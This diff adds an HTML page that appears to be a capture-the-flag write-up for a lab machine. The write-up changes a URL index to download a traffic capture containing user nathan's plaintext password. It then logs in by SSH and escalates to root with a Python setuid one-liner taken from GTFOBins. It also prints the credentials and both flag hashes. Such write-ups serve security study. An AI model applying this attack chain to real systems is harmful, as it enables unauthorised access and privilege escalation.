@@ -1,0 +1,37 @@
+<html>
+  
+  <head>
+    <meta charset="utf-8">
+  </head>
+  
+  <body>
+    <p>Accessing the web page we can see this web page http://10.10.10.245/data/4.
+      By default it set us to the number 4 or file 4. We can change the request
+      to 0 and download a .pcap file containing all network traffic where we
+      can capture the username and password for nathan.</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/8b3bfcd6-66cf-cc5e-3304-cf05ac8a6af2/image.png"
+      alt="">
+    </p>
+    <p>USER nathan</p>
+    <p>PASS Buck3tH4TF0RM3!</p>
+    <p>ssh as nathan</p>
+    <p>nathan:Buck3tH4TF0RM3!</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/c1bdf8e3-cd0a-577d-4a23-2c26120fb6b8/image.png"
+      alt="">
+    </p>
+    <p>user.txt - 43a60c707e9ee55d3c1c067366cfdc97</p>
+    <p>running linpeas we can see we have python suid/capabilities and looking
+      at gtfo bins we can exploit this.</p>
+    <p>navigate to /usr/bin</p>
+    <p>./python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'</p>
+    <p>&nbsp;</p>
+    <p>We are root
+      <img src="https://www.evernote.com/shard/s560/res/122774ff-ba56-26f0-c20f-103471a5174d/image.png"
+      alt="">
+    </p>
+    <p>root.txt - 7ecaf1f3cf53a5de0e4ba676e2693e3a</p>
+  </body>
+
+</html>
